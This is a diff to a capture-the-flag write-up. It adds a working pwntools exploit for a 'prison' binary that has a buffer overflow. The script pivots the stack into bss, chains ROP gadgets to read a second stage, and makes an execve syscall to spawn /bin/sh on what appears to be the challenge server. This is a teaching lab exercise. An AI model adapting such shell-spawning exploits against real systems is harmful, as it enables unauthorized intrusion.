@@ -78,6 +78,8 @@ int win()
 
 It has `win` function. Do `Return Address Overwrite`(`RAO?`).
 
+# exploit
+
 ```python
 from pwn import *
 
@@ -169,4 +171,41 @@ __int64 __fastcall prison(__int64 a1, int a2, int a3, int a4, int a5, int a6)
 ```
 
 Since it doesn't check `v20`, it has `oob` vuln, but anyway I didn't use this vuln.
-It also has `bof` vuln. I can us
+It also has `bof` vuln. I can use various gadget, so I exploit it with `stack pivoting`.
+
+# exploit
+
+```
+from pwn import *
+from time import *
+
+context.terminal = ['tmux', 'splitw', '-h']
+
+#p = process('./prison')
+p = remote('20.84.72.194', 5001)
+e = ELF('./prison')
+
+bss = 0x4d2500
+syscall = 0x00000000004013b8
+pop_rax = 0x000000000041f464
+pop_rdi = 0x0000000000401a0d
+xor_edi_rdi = 0x000000000047ddda
+pop_rsi_rbp = 0x0000000000413676
+pop_rdx = 0x0000000000401a1a
+leave = 0x0000000000401b54
+
+p.sendlineafter(b': ', b'1')
+payload = b'a' * 64 + p64(bss + 0x40) + p64(0x401b05)
+p.sendlineafter(b'name: ', payload)
+
+sleep(4)
+payload = p64(xor_edi_rdi) + p64(pop_rsi_rbp) + p64(bss + 0x100) + p64(bss + 0x100) + p64(pop_rdx) + p64(0x100) + p64(e.sym['read']) + p64(leave)
+payload += p64(bss - 8) + p64(leave)
+#gdb.attach(p)
+p.sendline(payload)
+
+sleep(4)
+payload = b'/bin/sh\x00' + p64(pop_rdi) + p64(bss + 0x100) + p64(pop_rsi_rbp) + p64(0) + p64(0) + p64(pop_rdx) + p64(0) + p64(pop_rax) + p64(0x3b) + p64(syscall)
+p.send(payload)
+p.interactive()
+```
